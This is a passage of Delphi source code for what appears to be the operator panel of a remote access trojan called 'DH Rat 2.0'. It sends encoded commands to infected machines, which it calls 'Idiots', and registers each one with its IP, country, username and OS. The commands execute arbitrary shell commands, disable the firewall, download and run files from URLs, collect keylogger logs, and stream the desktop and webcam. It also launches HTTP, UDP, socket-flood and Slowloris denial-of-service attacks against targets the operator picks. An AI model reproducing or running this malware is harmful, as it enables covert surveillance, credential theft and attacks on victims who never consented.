  console.Lines.Add('Running program version 1.0');
  console.Lines.Add('-----------------------------------' + sLineBreak);
  console.Lines.Add('Welcome to hell');
end;

procedure TFormHome.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if (FileExists('screenshot.jpg')) then
  begin
    DeleteFile('screenshot.jpg');
  end;
end;

procedure TFormHome.Send_Command(Command: string);
begin
  if not(lvIdiots.Itemindex = -1) then
  begin
    Command := base64_encode(Command);
    ssServer.Socket.Connections[lvIdiots.Itemindex].SendText(Command);
    message_box('DH Rat 2.0', 'Command Sended', 'Information');
  end
  else
  begin
    message_box('DH Rat 2.0', 'Select Idiot', 'Warning');
  end;
end;

// Commands

procedure TFormHome.ItemListFilesClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Directory : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![list_directory] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemReadFileClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'File : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![read_file] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemDeleteThisFileClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'File : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![delete_file] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemListProcessClick(Sender: TObject);
begin
  Send_Command('![list_process]');
end;

procedure TFormHome.ItemKillProcessClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Process name : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![kill_process] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemCommandClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Command : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![execute_command] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemActiveRegeditClick(Sender: TObject);
begin
  Send_Command('![enable_regedit]');
end;

procedure TFormHome.DisableRegeditClick(Sender: TObject);
begin
  Send_Command('![disable_regedit]');
end;

procedure TFormHome.ItemActiveFirewallClick(Sender: TObject);
begin
  Send_Command('![enable_firewall]');
end;

procedure TFormHome.ItemDisableFirewallClick(Sender: TObject);
begin
  Send_Command('![disable_firewall]');
end;

procedure TFormHome.ItemOpenCDClick(Sender: TObject);
begin
  Send_Command('![open_cd]');
end;

procedure TFormHome.ItemCloseCDClick(Sender: TObject);
begin
  Send_Command('![close_cd]');
end;

procedure TFormHome.ItemIconsShowClick(Sender: TObject);
begin
  Send_Command('![enable_icons]');
end;

procedure TFormHome.ItemHideIconsClick(Sender: TObject);
begin
  Send_Command('![disable_icons]');
end;

procedure TFormHome.ItemTaskbarShowClick(Sender: TObject);
begin
  Send_Command('![enable_taskbar]');
end;

procedure TFormHome.ItemTaskbarHideClick(Sender: TObject);
begin
  Send_Command('![disable_taskbar]');
end;

procedure TFormHome.ItemMessagesSingleClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Title : ', '');
  argument2 := InputBox('DH Rat 2.0', 'Message : ', '');
  if not(argument1 = '') and not(argument2 = '') then
  begin
    Send_Command('![message_single] [argument1]' + argument1 +
      '[argument1][argument2]' + argument2 + '[argument2]');
  end;
end;

procedure TFormHome.ItemMessagesBomberClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Title : ', '');
  argument2 := InputBox('DH Rat 2.0', 'Message : ', '');
  argument3 := InputBox('DH Rat 2.0', 'Count : ', '');
  if not(argument1 = '') and not(argument2 = '') and not(argument3 = '') then
  begin
    Send_Command('![message_bomber] [argument1]' + argument1 +
      '[argument1][argument2]' + argument2 + '[argument2][argument3]' +
      argument3 + '[argument3]');
  end;
end;

procedure TFormHome.SendKeysClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Text : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![sendkeys] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemWriteWordClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Text : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![sendkeys_word] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemCrazyMouseClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Count : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![crazy_mouse] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemCrazyHourClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Count : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![crazy_hour] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemShutdownClick(Sender: TObject);
begin
  Send_Command('![shutdown]');
end;

procedure TFormHome.ItemRebootClick(Sender: TObject);
begin
  Send_Command('![reboot]');
end;

procedure TFormHome.ItemCloseSessionClick(Sender: TObject);
begin
  Send_Command('![close_session]');
end;

procedure TFormHome.ItemOpenURLClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'URL : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![open_url] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemLoadPaintClick(Sender: TObject);
begin
  Send_Command('![load_paint]');
end;

procedure TFormHome.ItemChangeTextTaskbarEnableClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Text : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![change_taskbar_text_enable] [argument1]' + argument1 +
      '[argument1]');
  end;
end;

procedure TFormHome.ItemChangeTextTaskbarDisableClick(Sender: TObject);
begin
  Send_Command('![change_taskbar_text_disable]');
end;

procedure TFormHome.ItemTurnOffMonitorClick(Sender: TObject);
begin
  Send_Command('![turn_off_monitor]');
end;

procedure TFormHome.ItemSpeakClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Text : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![speak] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemPlayBeepsClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Text : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![play_beeps] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemListDrivesClick(Sender: TObject);
begin
  Send_Command('![list_drives]');
end;

procedure TFormHome.ItemListServicesClick(Sender: TObject);
begin
  Send_Command('![list_services]');
end;

procedure TFormHome.ItemListWindowsClick(Sender: TObject);
begin
  Send_Command('![list_windows]');
end;

procedure TFormHome.ItemDownloadAndExecuteClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'URL : ', '');
  argument2 := InputBox('DH Rat 2.0', 'New name : ', '');
  if not(argument1 = '') and not(argument2 = '') then
  begin
    Send_Command('![download_and_execute] [argument1]' + argument1 +
      '[argument1][argument2]' + argument2 + '[argument2]');
  end;
end;

procedure TFormHome.ItemWallpaperChangeClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'URL : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![download_and_change_wallpaper] [argument1]' + argument1 +
      '[argument1]');
  end;
end;

procedure TFormHome.ItemScreensaverChangeClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'URL : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![download_and_change_screensaver] [argument1]' + argument1 +
      '[argument1]');
  end;
end;

procedure TFormHome.ItemPrinterBomberClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'File to print : ', '');
  argument2 := InputBox('DH Rat 2.0', 'Count : ', '');
  if not(argument1 = '') and not(argument2 = '') then
  begin
    Send_Command('![printer_bomber] [argument1]' + argument1 +
      '[argument1][argument2]' + argument2 + '[argument2]');
  end;
end;

procedure TFormHome.ItemFormBomberClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Title : ', '');
  argument2 := InputBox('DH Rat 2.0', 'Text : ', '');
  argument3 := InputBox('DH Rat 2.0', 'Count : ', '');
  if not(argument1 = '') and not(argument2 = '') and not(argument3 = '') then
  begin
    Send_Command('![form_bomber] [argument1]' + argument1 +
      '[argument1][argument2]' + argument2 + '[argument2][argument3]' +
      argument3 + '[argument3]');
  end;
end;

procedure TFormHome.ItemHTMLBomberClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Title : ', '');
  argument2 := InputBox('DH Rat 2.0', 'Text : ', '');
  argument3 := InputBox('DH Rat 2.0', 'Count : ', '');
  if not(argument1 = '') and not(argument2 = '') and not(argument3 = '') then
  begin
    Send_Command('![html_bomber] [argument1]' + argument1 +
      '[argument1][argument2]' + argument2 + '[argument2][argument3]' +
      argument3 + '[argument3]');
  end;
end;

procedure TFormHome.ItemWindowsBomberClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Count : ', '');
  if not(argument1 = '') then
  begin
    Send_Command('![windows_bomber] [argument1]' + argument1 + '[argument1]');
  end;
end;

procedure TFormHome.ItemBlockAllClick(Sender: TObject);
begin
  Send_Command('![block_all]');
end;

procedure TFormHome.ItemSQLI_DoSClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Web : ', 'http://localhost/');
  argument2 := InputBox('DH Rat 2.0', 'Count : ', '5');
  if not(argument1 = '') and not(argument2 = '') then
  begin
    Send_Command('![ddos_sqli_dos] [argument1]' + argument1 +
      '[argument1][argument2]' + argument2 + '[argument2]');
  end;
end;

procedure TFormHome.ItemHTTP_FloodClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Web : ', 'http://localhost/');
  argument2 := InputBox('DH Rat 2.0', 'Count : ', '5');
  if not(argument1 = '') and not(argument2 = '') then
  begin
    Send_Command('![ddos_http_flood] [argument1]' + argument1 +
      '[argument1][argument2]' + argument2 + '[argument2]');
  end;
end;

procedure TFormHome.ItemSocket_FloodClick(Sender: TObject);
var
  add_ip: string;
  add_port: string;
begin
  add_ip := InputBox('DH Rat 2.0', 'IP : ', '127.0.0.1');
  add_port := InputBox('DH Rat 2.0', 'Port : ', '80');
  argument2 := InputBox('DH Rat 2.0', 'Flood : ', 'GET / HTTP/1.1' + #13#10 +
    'Host:' + '127.0.0.1' + #13#10 +
    'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0'
    + #13#10 + 'Connection: Keep-Alive' + #13#10 + #13#10);
  argument3 := InputBox('DH Rat 2.0', 'Count : ', '5');
  if not(argument1 = '') and not(add_port = '') and not(argument2 = '') and
    not(argument3 = '') then
  begin
    argument1 := '[ddos_socket_flood_ip]' + add_ip +
      '[ddos_socket_flood_ip][ddos_socket_flood_port]' + add_port +
      '[ddos_socket_flood_port]';
    Send_Command('![ddos_socket_dos] [argument1]' + argument1 +
      '[argument1][argument2]' + argument2 + '[argument2][argument3]' +
      argument3 + '[argument3]');
  end;
end;

procedure TFormHome.ItemSlowlorisClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'Web : ',
    'http://localhost/index.php?id=');
  argument2 := InputBox('DH Rat 2.0', 'Count : ', '5');
  if not(argument1 = '') and not(argument2 = '') then
  begin
    Send_Command('![ddos_slowloris] [argument1]' + argument1 +
      '[argument1][argument2]' + argument2 + '[argument2]');
  end;
end;

procedure TFormHome.ItemUDP_FloodClick(Sender: TObject);
begin
  argument1 := InputBox('DH Rat 2.0', 'IP : ', '127.0.0.1');
  argument2 := InputBox('DH Rat 2.0', 'Port : ', '6668');
  argument3 := InputBox('DH Rat 2.0', 'Count : ', '5');
  if not(argument1 = '') and not(argument2 = '') and not(argument3 = '') then
  begin
    Send_Command('![ddos_udp_flood] [argument1]' + argument1 +
      '[argument1][argument2]' + argument2 + '[argument2][argument3]' +
      argument3 + '[argument3]');
  end;
end;

procedure TFormHome.ItemKeyloggerClick(Sender: TObject);
begin
  Send_Command('![keylogger_logs]');
end;

procedure TFormHome.ItemStartCaptureDesktopClick(Sender: TObject);
begin
  Send_Command('![start_desktop_capture]');
  capture_online := True;
  desktop_online := True;
  webcam_online := False;
  frmDesktopCapture.imgCapture.Picture := nil;
end;

procedure TFormHome.ItemStopCaptureDesktopClick(Sender: TObject);
begin
  Send_Command('![stop_desktop_capture]');
  capture_online := False;
  desktop_online := False;
  webcam_online := False;
  frmDesktopCapture.imgCapture.Picture := nil;
  frmDesktopCapture.Caption := 'Desktop Capture';
  frmDesktopCapture.Hide;
end;

procedure TFormHome.ItemStartCaptureWebcamClick(Sender: TObject);
begin
  Send_Command('![start_webcam_capture]');
  capture_online := True;
  webcam_online := True;
  desktop_online := False;
  frmDesktopCapture.imgCapture.Picture := nil;
end;

procedure TFormHome.ItemStopCaptureWebcamClick(Sender: TObject);
begin
  Send_Command('![stop_webcam_capture]');
  capture_online := False;
  webcam_online := False;
  desktop_online := False;
  frmDesktopCapture.Caption := 'Webcam Capture';
  frmWebcamCapture.Hide;
end;

procedure TFormHome.ItemUninstallerClick(Sender: TObject);
begin
  Send_Command('![uninstaller]');
end;

// End Of Commands

procedure TFormHome.ssRemoteServerClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
  socket_buffer: array [0 .. 9999] of Char;
  socket_data1, socket_data2: integer;
begin

  socket_data1 := Socket.ReceiveLength;

  while socket_data1 > 0 do
  begin
    try
      begin
        socket_data2 := Socket.ReceiveBuf(socket_buffer, Sizeof(socket_buffer));

        if socket_data2 <= 0 then
        begin
          Break;
        end
        else
        begin
          file_stream.Write(socket_buffer, socket_data2);
        end;

        if file_stream.Size >= file_size then
        begin
          file_stream.Free;
          if (capture_online = True) then
          begin
            if FileExists('screenshot.jpg') then
            begin
              if (desktop_online = True) then
              begin
                frmDesktopCapture.imgCapture.Picture.LoadFromFile
                  ('screenshot.jpg');
              end;
              if (webcam_online = True) then
              begin
                frmWebcamCapture.imgCapture.Picture.LoadFromFile
                  ('screenshot.jpg');
              end;
              DeleteFile('screenshot.jpg');
            end;
          end;
          ssRemoteServer.Close;
          Break;
        end;

      end;
    except
      begin
        //
      end;
    end;
  end;

end;

procedure TFormHome.ssServerClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
var
  i: integer;
  host, host_list: string;
begin
  host := Socket.RemoteHost;
  for i := 0 to lvIdiots.Items.Count - 1 do
  begin
    host_list := lvIdiots.Items[i].SubItems[0];
    if (host = host_list) then
    begin
      lvIdiots.Items[i].Delete;
      Dec(idiots_found);
      idiots_found_now.Caption := 'Idiots found : ' + IntToStr(idiots_found);
      message_box('DH Rat 2.0', 'Client ' + host + ' Disconnected',
        'Information');
    end;
  end;
end;

procedure TFormHome.ssServerClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
  code: string;
  host: string;
  ip: string;
  country: string;
  country_image: string;
  username: string;
  os: string;
var
  output_socket: string;
  data_socket: string;
  cmd_socket: string;
  Command: string;

begin

  code := Socket.ReceiveText;
  output_socket := code;

  if (Pos('![noob_response]', code) > 0) then
  begin
    code := StringReplace(code, '![noob_response]', '',
      [rfReplaceAll, rfIgnoreCase]);
    console.Lines.Add(sLineBreak + '-------------------------------------' +
      sLineBreak);
    console.Lines.Add('[+] Idiot : ' + Socket.RemoteHost + sLineBreak);
    console.Lines.Add(code);
    console.Lines.Add(sLineBreak + '-------------------------------------');
  end;

  data_socket := copy(output_socket, 10, length(output_socket));
  cmd_socket := copy(output_socket, 0, 9);

  if (Pos('!CMD User : ', output_socket) > 0) then
  begin
    Command := output_socket;
    Command := StringReplace(Command, '!CMD User : ', '',
      [rfReplaceAll, rfIgnoreCase]);
    username_idiot := Command;
  end;

  if (Pos('!CMD Webcam : ', output_socket) > 0) then
  begin
    Command := output_socket;
    Command := StringReplace(Command, '!CMD Webcam : ', '',
      [rfReplaceAll, rfIgnoreCase]);
    webcam_idiot := Command;
  end;

  if (Pos('!CMD Status : ', output_socket) > 0) then
  begin
    Command := output_socket;
    Command := StringReplace(Command, '!CMD Status : ', '',
      [rfReplaceAll, rfIgnoreCase]);
    status_idiot := Command;
    if (status_idiot = 'READY') then
    begin
      if (desktop_online = True) then
      begin
        frmDesktopCapture.Caption := 'Username ' + username_idiot +
          ' : Connected';
        frmDesktopCapture.Show;
      end;
      if (webcam_online = True) then
      begin
        frmWebcamCapture.Caption := 'Username ' + username_idiot +
          ' with webcam ' + webcam_idiot + ' : Recording';
        frmWebcamCapture.Show;
      end;
    end
    else
    begin
      if (desktop_online = True) then
      begin
        message_box('DH Rat 2.0', 'Connection not ready', 'Error');
      end;
      if (webcam_online = True) then
      begin
        message_box('DH Rat 2.0', 'Webcam not detected', 'Error');
      end;
    end;
  end;

  if (cmd_socket = '!FILENAME') then
  begin
    file_stream := TFileStream.Create(data_socket, fmCREATE or fmOpenWrite and
      fmsharedenywrite);

    if (desktop_online = True) then
    begin
      ssRemoteServer.Open;
    end;

    if (webcam_online = True) then
    begin
      ssRemoteServer.Open;
    end;

  end;

  if (cmd_socket = '!FILESIZE') then
  begin
    file_size := StrToInt(data_socket);
  end;

  if (Pos('![noob_register]', code) > 0) then
  begin

    ip := regex(code, '[ip]', '[ip]');
    country := regex(code, '[country]', '[country]');
    country_image := regex(code, '[country_image]', '[country_image]');
    username := regex(code, '[username]', '[username]');
    os := regex(code, '[os]', '[os]');

    if (ip = '') then
    begin
      ip := '';
    end;

    if (country = '') then
    begin
      country := '?';
    end;

    if (username = '') then
    begin
      username := '?';
    end;

    if (os = '') then
    begin
      os := '?';
    end;

    with lvIdiots.Items.Add do
    begin
      Inc(idiots_found);
      Caption := IntToStr(idiots_found);
      SubItems.Add(Socket.RemoteHost);
      SubItems.Add(ip);
      SubItems.Add(country);
      SubItems.Add(username);
      SubItems.Add(os);
    end;

    idiots_found_now.Caption := 'Idiots found : ' + IntToStr(idiots_found);

    notificar.BalloonTitle := 'Idiot Found';
    notificar.BalloonHint := ip;
    notificar.ShowBalloonHint;

  end;

  if (Pos('![keylogger_logs]', code) > 0) then
  begin

    code := StringReplace(code, '![keylogger_logs]', '',
      [rfReplaceAll, rfIgnoreCase]);
    code := StringReplace(code, '[+] File open : OK', '',
      [rfReplaceAll, rfIgnoreCase]);

    if (FileExists('keylogger_logs.html')) then
    begin
      DeleteFile('keylogger_logs.html');
    end;

    savefile(GetCurrentDir + '\' + 'keylogger_logs.html', code);

    message_box('DH Rat 2.0', 'Keylogger Logs Received', 'Information');

    ShellExecute(0, nil, PChar(GetCurrentDir + '\' + 'keylogger_logs.html'),
      nil, nil, SW_SHOWNORMAL);

  end;

end;

procedure TFormHome.ssServerListen(Sender: TObject; Socket: TCustomWinSocket);
begin
  status.Panels[0].text := '[+] Online';
  status.Update;
end;

procedure TFormHome.StartServer1Click(Sender: TObject);
begin
  ssServer.Active := True;
  ssRemoteServer.Active := True;
  status.Panels[0].text := '[+] Online';
  status.Update;
end;

procedure TFormHome.StopServer1Click(Sender: TObject);
begin
  ssServer.Active := False;
  ssRemoteServer.Active := False;
  status.Panels[0].text := '[+] OffLine';
  status.Update;
end;

end.

// The End ?
